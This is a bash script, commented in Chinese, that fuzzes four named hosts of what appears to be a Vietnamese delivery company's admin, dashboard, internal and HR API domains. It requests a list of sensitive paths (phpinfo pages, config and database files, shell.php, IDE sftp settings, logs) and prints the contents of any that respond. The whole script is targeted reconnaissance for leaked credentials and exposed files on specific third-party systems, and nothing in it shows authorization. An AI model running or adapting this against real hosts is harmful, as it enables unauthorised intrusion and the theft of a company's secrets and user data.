#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 大规模Fuzz - 所有系统所有端点"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGETS=(
    "admin.giaohangtietkiem.vn"
    "dashboard.ghtk.vn"
    "inter.ghtk.vn"
    "hrm-api.ghtk.vn"
)

# 常见文件泄露路径
LEAK_FILES=(
    "/phpinfo.php"
    "/info.php"
    "/test.php"
    "/1.php"
    "/shell.php"
    "/config.php"
    "/db.php"
    "/database.php"
    "/connect.php"
    "/admin.php"
    "/login.php"
    "/upload.php"
    "/.DS_Store"
    "/desktop.ini"
    "/Thumbs.db"
    "/.idea/workspace.xml"
    "/.vscode/sftp.json"
    "/debug.log"
    "/error.log"
    "/access.log"
)

echo "[*] 批量Fuzz所有目标..."
echo ""

for target in "${TARGETS[@]}"; do
    echo "━━━ $target ━━━"
    
    for file in "${LEAK_FILES[@]}"; do
        status=$(curl -sk "https://$target$file" -w "%{http_code}" -o /tmp/fuzz -m 1 2>/dev/null)
        
        if [ "$status" == "200" ] && [ -s /tmp/fuzz ]; then
            if ! grep -q "\"success\":false" /tmp/fuzz 2>/dev/null; then
                echo "  ✅ $file → 200"
                head -10 /tmp/fuzz
                echo "  ━━━"
            fi
        fi
    done
    echo ""
done

